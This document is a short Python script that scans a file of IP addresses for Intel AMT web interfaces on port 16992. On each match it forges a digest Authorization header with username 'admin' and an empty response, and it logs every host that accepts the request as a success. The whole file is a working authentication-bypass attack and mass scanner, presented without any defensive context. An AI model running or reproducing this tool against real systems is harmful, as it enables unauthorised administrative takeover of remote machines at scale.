import requests
import sys
servers = ['Intel(R) Active Management Technology', 'Intel(R) Standard Manageability', 'Intel(R) Small Business Technology', 'AMT']
timeout = 8
resultScan = sys.argv[2]
IPtxt = sys.argv[1]
file = open(resultScan, 'a+')
def checkVuln(serverStatus, req, url):
	try:
		if serverStatus == True:
			www_authenticate = req.headers.get('WWW-Authenticate')
			www_authenticate = www_authenticate.replace('stale="false"', 'username=admin,response=,uri=/index.htm,nc=00000001,cnonce=60513ab58858482c')
			headers = {"Authorization": www_authenticate}
			req2 = requests.get(url, headers=headers)
			if req2.status_code == 200:
				print('\033[4m\033[32m{}\033[0m'.format(f'[ success         ]=>  {IP}:16992'))
				file.write(f'{IP}\n')
			else:
				print('\033[4m\033[31m{}\033[0m'.format(f'[ failed          ]=>  {IP}:16992'))
	except requests.exceptions.ConnectionError:
		print('\033[4m\033[36m{}\033[0m'.format(f'[ conection error ]=>   {IP}:16992'))
def checkServer(IP):
	try:
		url = (f'http://{IP}:16992/index.html')
		headers = {"User-Agent": "Mozilla/5.0"}
		req = requests.get(url, headers=headers, timeout=timeout)
		if req.status_code == 401:
			server = req.headers['Server']
			for serv in servers:
				if serv in server:
					serverStatus = True
					checkVuln(serverStatus, req, url)
					break
	except requests.exceptions.ConnectionError:
		print('\033[4m\033[36m{}\033[0m'.format(f'[ conection error ]=>   {IP}:16992'))
with open(IPtxt,'r') as handle:
	IPs = handle.readlines()
	for IPr in IPs:
		IP = IPr.rstrip()
		checkServer(IP)